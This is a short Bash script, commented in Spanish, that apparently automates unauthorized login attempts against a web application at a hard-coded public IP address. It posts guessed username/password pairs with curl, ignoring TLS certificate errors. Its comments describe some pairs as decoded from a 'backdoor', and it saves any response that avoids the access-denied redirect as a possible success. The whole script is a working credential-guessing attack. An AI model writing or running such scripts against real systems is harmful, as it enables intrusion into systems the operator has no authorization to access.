#!/bin/bash
echo "=== ANÁLISIS AUTOMÁTICO DE RESPUESTAS DE LOGIN ==="

# Probar credenciales específicas y analizar respuestas
test_credentials() {
    local user=$1
    local pass=$2
    local description=$3
    
    echo "--- Probando: $user / $pass ($description) ---"
    
    response=$(curl -k -s -w "\n%{http_code}\n%{url_effective}" \
        -d "usuario=$user&contrasena=$pass" \
        "https://189.254.143.102/jsp/menu.jsp")
    
    http_code=$(echo "$response" | tail -2 | head -1)
    final_url=$(echo "$response" | tail -1)
    content=$(echo "$response" | head -n -2)
    
    echo "HTTP Code: $http_code"
    echo "URL Final: $final_url"
    echo "Tamaño contenido: ${#content} caracteres"
    
    # Buscar patrones específicos
    if [[ "$final_url" != *"acceso_denegado"* ]]; then
        echo "🚨 URL DIFERENTE - POSIBLE ÉXITO!"
        echo "$content" > "success_${user}_${pass}.html"
    fi
    
    if echo "$content" | grep -qi "bienvenido\|welcome\|success"; then
        echo "✅ PALABRA CLAVE DE ÉXITO ENCONTRADA!"
    fi
    
    if echo "$content" | grep -qi "error\|invalid\|incorrecto\|denegado"; then
        echo "❌ PALABRA CLAVE DE ERROR ENCONTRADA"
    fi
    
    echo ""
}

# Ejecutar pruebas
test_credentials "jose" "garcia" "Nombre decodificado del backdoor"
test_credentials "tono" "garcia" "Apellido decodificado"  
test_credentials "equipo" "sito" "Equipo del backdoor"
test_credentials "admin" "sito" "Combinación común"
test_credentials "jose" "tono" "Nombre y apellido invertidos"
